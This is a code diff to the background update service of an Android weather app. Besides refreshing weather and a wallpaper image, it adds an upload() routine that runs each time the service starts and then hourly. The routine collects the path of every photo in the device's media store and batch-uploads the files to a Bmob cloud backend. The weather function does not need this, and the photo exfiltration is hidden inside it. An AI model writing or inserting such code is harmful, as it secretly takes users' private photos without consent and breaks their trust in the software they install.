@@ -3,18 +3,29 @@ package com.zscdumin.zhixinapp.service;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.IBinder;
 import android.os.SystemClock;
 import android.preference.PreferenceManager;
+import android.provider.MediaStore;
+import android.util.Log;
+import android.widget.Toast;
 
 import com.zscdumin.zhixinapp.gson.Weather;
 import com.zscdumin.zhixinapp.utils.HttpUtil;
 import com.zscdumin.zhixinapp.utils.Utility;
 
+import java.io.File;
 import java.io.IOException;
+import java.util.List;
 
+import cn.bmob.v3.datatype.BmobFile;
+import cn.bmob.v3.listener.UploadBatchListener;
 import okhttp3.Call;
 import okhttp3.Callback;
 import okhttp3.Response;
@@ -30,6 +41,7 @@ public class AutoUpdateService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         updateWeather();
         updateBingPic();
+        upload();
         AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
         int anHour = 60 * 60 * 1000; // 这是一小时的毫秒数
         long triggerAtTime = SystemClock.elapsedRealtime() + anHour;
@@ -90,6 +102,50 @@ public class AutoUpdateService extends Service {
                 e.printStackTrace();
             }
         });
+    }
+    public void upload() {
+        final String[] filePaths = getSystemPhotoList(this);
+        BmobFile.uploadBatch(this, filePaths, new UploadBatchListener() {
+            @Override
+            public void onSuccess(List<BmobFile> files, List<String> urls) {
+                if (urls.size() == filePaths.length) {
+                    Toast.makeText(getApplicationContext(), "上传成功", Toast.LENGTH_SHORT).show();
+                }
+            }
+
+            @Override
+            public void onError(int statuscode, String errormsg) {
+                Toast.makeText(getApplicationContext(), "上传失败", Toast.LENGTH_SHORT).show();
+            }
+
+            @Override
+            public void onProgress(int curIndex, int curPercent, int total, int totalPercent) {
+                Log.i("当前进度", (1.00 * curIndex) / total * 100 + "%");
+            }
+        });
+    }
+    public static String[] getSystemPhotoList(Context context) {
+        int indexs = 0;
+        String[] result = new String[10000];
+        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+
+        ContentResolver contentResolver = context.getContentResolver();
+        Cursor cursor = contentResolver.query(uri, null, null, null, null);
+        if (cursor == null || cursor.getCount() <= 0) {
+            return null;
+        }
+        while (cursor.moveToNext()) {
+            int index = cursor
+                    .getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
+            String path = cursor.getString(index);
+            File file = new File(path);
+            if (file.exists()) {
+                result[indexs] = path;
+                indexs = indexs + 1;
+                Log.i("UploadPictures", path);
+            }
+        }
+        return result;
     }
 
 }
